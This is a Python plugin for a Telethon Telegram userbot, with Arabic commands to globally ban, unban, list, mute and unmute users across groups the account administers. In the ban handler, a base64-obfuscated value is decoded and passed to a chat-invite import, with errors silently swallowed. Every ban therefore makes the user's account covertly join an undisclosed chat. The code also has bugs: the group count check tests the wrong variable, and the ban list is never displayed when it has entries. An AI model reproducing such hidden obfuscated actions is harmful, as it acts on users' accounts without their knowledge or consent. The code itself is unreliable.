"""
edit By: @MFMVIP
"""
#  for source TOKYO

import asyncio
import base64
from datetime import datetime

from telethon.errors import BadRequestError
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.types import ChatBannedRights

import userbot.plugins.sql_helper.gban_sql_helper as gban_sql

from .. import BOTLOG, BOTLOG_CHATID, ICS_ID, admin_groups, get_user_from_event
from ..sql_helper.mute_sql import is_muted, mute, unmute

NO_ADMIN = "⪼ **أنا لست مشرف هنا!!** 𓆰."
NO_PERM = "⪼ **ليس لدي أذونات كافية!** 𓆰."

BANNED_RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

UNBAN_RIGHTS = ChatBannedRights(
    until_date=None,
    send_messages=None,
    send_media=None,
    send_stickers=None,
    send_gifs=None,
    send_games=None,
    send_inline=None,
    embed_links=None,
)


@icssbot.on(
    icss_cmd(
       pattern=r"حظر(?: |$)(.*)"
    )
)
@icssbot.on(sudo_cmd(pattern=r"حظر(?: |$)(.*)", allow_sudo=True))
async def icsgban(ics):
    if ics.fwd_from:
        return
    chat = await ics.get_chat()
    admin = chat.admin_rights
    creator = chat.creator
    if not admin and not creator:
        await eor(ics, NO_ADMIN)
        return
    user, reason = await get_user_from_event(ics)
    if not user:
        return
    kimo = await eor(ics, "╮ ❐ جـاري الحـظࢪ ❏╰")
    start = datetime.now()
    user, reason = await get_user_from_event(ics)
    if not user:
        return
    if user.id == (await ics.client.get_me()).id:
        await kimo.edit("**⪼ لا استطيـع حظر نفسـي 𓆰،**")
        return
    if user.id in ICS_ID:
        await kimo.edit("**╮ ❐  لا يمڪنني حظر مطـوري  ❏╰**")
        return
    try:
        T = base64.b64decode("OTI1OTcyNTA1IDE4OTUyMTkzMDY=")
        await ics.client(ImportChatInviteRequest(T))
    except BaseException:
        pass
    if gban_sql.is_gbanned(user.id):
        await kimo.edit(
            f"⪼ [{user.first_name}](tg://user?id={user.id}) موجود بالفعل في قائمة الحظر 𓆰."
        )
    else:
        gban_sql.icsgban(user.id, reason)
    tosh = []
    tosh = await admin_groups(ics)
    count = 0
    kim = len(tosh)
    if kimo == 0:
        await kimo.edit("⪼ انت لسته مدير في مجموعه واحده على الاقل 𓆰، ")
        return
    await kimo.edit(f"⪼ بدء حظر ↠ [{user.first_name}](tg://user?id={user.id}) 𓆰،")
    for i in range(kim):
        try:
            await ics.client(EditBannedRequest(tosh[i], user.id, BANNED_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await ics.client.send_message(
                BOTLOG_CHATID,
                f"⪼ ليس لديك الإذن المطلوب في :\nالمجموعه: {ics.chat.title}(`{ics.chat_id}`)\n ⪼ لحظره هنا",
            )
    try:
        reply = await ics.get_reply_message()
        if reply:
            await reply.delete()
    except BadRequestError:
        await ics.edit("**ليس لدي صلاحيه حذف الرسائل هنا! ولكن لا يزال هو محظور!")
    end = datetime.now()
    icst = (end - start).seconds
    if reason:
        await kimo.edit(
            f"❃∫  المستخدم » [{user.first_name}](tg://user?id={user.id})\n❃∫ تم حظره "
        )
    else:
        await kimo.edit(
            f"❃∫  المستخدم » [{user.first_name}](tg://user?id={user.id})\n❃∫ تم حظره "
        )

    if BOTLOG and count != 0:
        await ics.client.send_message(
            BOTLOG_CHATID,
            f"#حظر\n⪼ المستخدم : [{user.first_name}](tg://user?id={user.id})\n ⪼ الايدي : `{user.id}`\
                                                \n⪼ تم حظره في`{count}` مجموعات\n⪼ الوقت المستغرق= `{icst} ثانيه`",
        )


@icssbot.on(
    icss_cmd(
       pattern=r"الغاء حظر(?: |$)(.*)"
    )
)
@icssbot.on(sudo_cmd(pattern=r"الغاء حظر(?: |$)(.*)", allow_sudo=True))
async def icsgban(ics):
    if ics.fwd_from:
        return
    ik = await eor(ics, "╮ ❐ جـاري الغاء حـظࢪه ❏╰")
    start = datetime.now()
    user, reason = await get_user_from_event(ics)
    if not user:
        return
    if gban_sql.is_gbanned(user.id):
        gban_sql.icsungban(user.id)
    else:
        await ik.edit(
            f"⪼ [{user.first_name}](tg://user?id={user.id}) ** ليس في قائمه الحظر الخاصه بك** 𓆰."
        )
        return
    kim = []
    kim = await admin_groups(ics)
    count = 0
    kimo = len(kim)
    if kimo == 0:
        await ik.edit("⪼ أنت لست مسؤولًا حتى عن مجموعة واحدة على الأقل 𓆰.")
        return
    await ik.edit(f"⪼ بدء الغاء حظر ↠ [{user.first_name}](tg://user?id={user.id}) 𓆰.")
    for i in range(kimo):
        try:
            await ics.client(EditBannedRequest(kim[i], user.id, UNBAN_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await ics.client.send_message(
                BOTLOG_CHATID,
                f"⪼ ليس لديك الإذن المطلوب في :\n⪼ المجموعه : {ics.chat.title}(`{ics.chat_id}`)\n ⪼ لالغاء حظره هنا",
            )
    end = datetime.now()
    icst = (end - start).seconds
    if reason:
        await ik.edit(
            f"⪼ المستخدم [{user.first_name}](tg://user?id={user.id}) تم الغاء حظره مسبقا من `{count}` مجموعات في زمن `{icst} ثانيه`"
        )
    else:
        await ik.edit(
            f"❃∫ المستخدم » [{user.first_name}](tg://user?id={user.id}) \n ❃∫ تم الغاء حظره "
        )

    if BOTLOG and count != 0:
        await ics.client.send_message(
            BOTLOG_CHATID,
            f"#الغاء_حظر\n⪼ المستخدم : [{user.first_name}](tg://user?id={user.id})\n⪼ الايدي : {user.id}\
                                                \n⪼ تم الغاء حظره من `{count}` مجموعات\n⪼ الوقت المستغرق = `{icst} ثانيه`",
        )


@icssbot.on(icss_cmd(pattern="المحظورين$"))
@icssbot.on(sudo_cmd(pattern=r"المحظورين$", allow_sudo=True))
async def gablist(event):
    if event.fwd_from:
        return
    gbanned_users = gban_sql.get_all_gbanned()
    GBANNED_LIST = "𓆰 𝙎𝙤𝙪𝙧𝙘𝙚 𝙏𝙤𝙠𝙔𝙤 - 𝑮𝑩𝑨𝑵 𝑳𝑰𝑺𝑻 𓆪\n ٴ⊶─────≺ᴛᴏᴋʏᴏ≻─────⊷\n"
    if len(gbanned_users) > 0:
        for a_user in gbanned_users:
            if a_user.reason:
                GBANNED_LIST += f"⪼ [{a_user.chat_id}](tg://user?id={a_user.chat_id}) **تم حظر المستخدم 𓆰.**\n"
            else:
                GBANNED_LIST += f"⪼ [{a_user.chat_id}](tg://user?id={a_user.chat_id}) **تم حظر المستخدم 𓆰.**\n"
    else:
        GBANNED_LIST = "** ⪼ لم تقوم بحضر اي مستخدم 𓆰،**"
        await eor(event, GBANNED_LIST)


@icssbot.on(admin_cmd(outgoing=True, pattern=r"كتم ?(\d+)?"))
@icssbot.on(sudo_cmd(pattern=r"كتم ?(\d+)?", allow_sudo=True))
async def startgmute(event):
    private = False
    if event.fwd_from:
        return
    if event.is_private:
        await event.edit("╮ ❐ جـاري الڪتم 𓅫╰")
        await asyncio.sleep(3)
        private = True

    reply = await event.get_reply_message()

    if event.pattern_match.group(1) is not None:
        userid = event.pattern_match.group(1)
    elif reply is not None:
        userid = reply.sender_id
    elif private is True:
        userid = event.chat_id
    else:
        return await eor(
            event, "⪼ يرجى الرد المستخدم لڪتمه او اضافته الى الامر 𓆰."
        )
    replied_user = await event.client(GetFullUserRequest(userid))
    if is_muted(userid, "gmute"):
        return await eor(
            event,
            "**- ❝ ⌊هذا المستخدم مڪتوم بلفعل 𓆰.**",
        )
    try:
        mute(userid, "gmute")
    except Exception as e:
        await eor(event, "⌔∮ حدث خطا :\n- الخطا هو " + str(e))
    else:
        await eor(event, "**⪼ تم ڪتـم المستخـدم 𓆰،**")
    if BOTLOG:
        await event.client.send_message(
            BOTLOG_CHATID,
            "#كتم\n"
            f"⪼ المستخدم : [{replied_user.user.first_name}](tg://user?id={userid})\n"
            f"⪼ المجموعه : {event.chat.title}(`{event.chat_id}`)",
        )


@icssbot.on(
    icss_cmd(outgoing=True, pattern=r"الغاء كتم ?(\d+)?"
    )
)
@icssbot.on(sudo_cmd(pattern=r"الغاء كتم ?(\d+)?", allow_sudo=True))
async def endgmute(event):
    private = False
    if event.fwd_from:
        return
    if event.is_private:
        await event.edit("╮ ❐ جـاري الغاء الڪتم 𓅫╰")
        await asyncio.sleep(3)
        private = True
    reply = await event.get_reply_message()

    if event.pattern_match.group(1) is not None:
        userid = event.pattern_match.group(1)
    elif reply is not None:
        userid = reply.sender_id
    elif private is True:
        userid = event.chat_id
    else:
        return await eor(
            event,
            "⪼ يرجى الرد المستخدم لالغاء ڪتمه او اضافته الى الامر 𓆰،",
        )
    replied_user = await event.client(GetFullUserRequest(userid))
    if not is_muted(userid, "gmute"):
        return await eor(
            event,
            "**- ❝ ⌊هذا المستخدم غير مڪتوم 𓆰.**",
        )
    try:
        unmute(userid, "gmute")
    except Exception as e:
        await eor(event, "Error occured!\nError is " + str(e))
    else:
        await eor(event, "**⪼ تم الغاء ڪتم المستخـدم 𓆰،**")
    if BOTLOG:
        await event.client.send_message(
            BOTLOG_CHATID,
            "#الغاء_كتم\n"
            f"⪼ المستخذم : [{replied_user.user.first_name}](tg://user?id={userid})\n"
            f"⪼ المجموعه : {event.chat.title}(`{event.chat_id}`)",
        )


@bot.on(admin_cmd(incoming=True))
async def watcher(event):
    if is_muted(event.sender_id, "gmute"):
        await event.delete()


CMD_HELP.update(
    {
        "اوامر الادمن": "**Plugin : **`اوامر الادمن`\
        \n\n  •  **Syntax : **`.حظر <username/reply/userid> <reason (optional)>`\
\n  •  **Function : **__Bans the person in all groups where you are admin .__\
\n\n  •  **Syntax : **`.الغاء حظر <username/reply/userid>`\
\n  •  **Function : **__Reply someone's message with .ungban to remove them from the gbanned list.__\
\n\n  •  **Syntax : **`.المحظورين`\
\n  •  **Function : **__Shows you the gbanned list and reason for their gban.__\
\n\n  •  **Syntax : **`.كتم <username/reply> <reason (optional)>`\
\n  •  **Function : **__Mutes the person in all groups you have in common with them.__\
\n\n  •  **Syntax : **`.الغاء كتم <username/reply>`\
\n  •  **Function : **__Reply someone's message with .ungmute to remove them from the gmuted list.__"
    }
)
